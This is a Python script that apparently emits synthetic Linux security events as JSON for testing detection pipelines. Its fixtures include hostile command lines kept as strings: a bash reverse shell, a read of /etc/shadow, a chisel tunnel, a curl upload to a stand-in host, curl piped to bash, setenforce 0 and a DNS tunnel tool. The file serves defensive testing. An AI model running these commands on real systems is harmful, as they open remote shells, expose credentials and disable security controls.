#!/usr/bin/env python3
"""Emit synthetic Linux security events; commands are log strings and are never executed."""
import argparse
import datetime
import json
import uuid

CASES = [
    ("reverse-shell", "198.18.0.201", "bash", "bash -i >& /dev/tcp/198.18.0.250/4444 0>&1"),
    ("credential-read", "198.18.0.202", "cat", "cat /etc/shadow"),
    ("cron-write", "198.18.0.203", "bash", "echo test > /etc/cron.d/codex_test"),
    ("tunnel-proxy", "198.18.0.204", "chisel", "chisel client 198.18.0.250:8080 R:2222:127.0.0.1:22"),
    ("data-upload", "198.18.0.205", "curl", "curl -T /tmp/codex-test-data https://example.invalid/upload"),
    ("pipe-shell", "198.18.0.206", "curl", "curl https://example.invalid/test | bash"),
    ("security-disable", "198.18.0.207", "setenforce", "setenforce 0"),
    ("dns-tunnel-tool", "198.18.0.208", "iodine", "iodine -f test.example.invalid"),
    ("control-crontab-list", "198.18.0.209", "crontab", "crontab -l"),
    ("control-known-hosts", "198.18.0.210", "cat", "cat /root/.ssh/known_hosts"),
]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--kafka-key", action="store_true", help="prefix each JSON line with family and a tab")
    args = parser.parse_args()
    now = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="milliseconds")
    run = uuid.uuid4().hex[:12]
    family = "tracing_sas_linux"
    for case, host, proc, command in CASES:
        event = {
            "index_family": family,
            "event_id": "security-fixture-" + run + "-" + case,
            "payload": {
                "@timestamp": now,
                "host_ip": host,
                "username": "security_fixture",
                "proc_name": proc,
                "cmdline": command,
                "cmd_chain": "[]",
                "test_case": case,
                "test_run": run,
            },
        }
        prefix = family + "\t" if args.kafka_key else ""
        print(prefix + json.dumps(event, ensure_ascii=False, separators=(",", ":")))


if __name__ == "__main__":
    main()
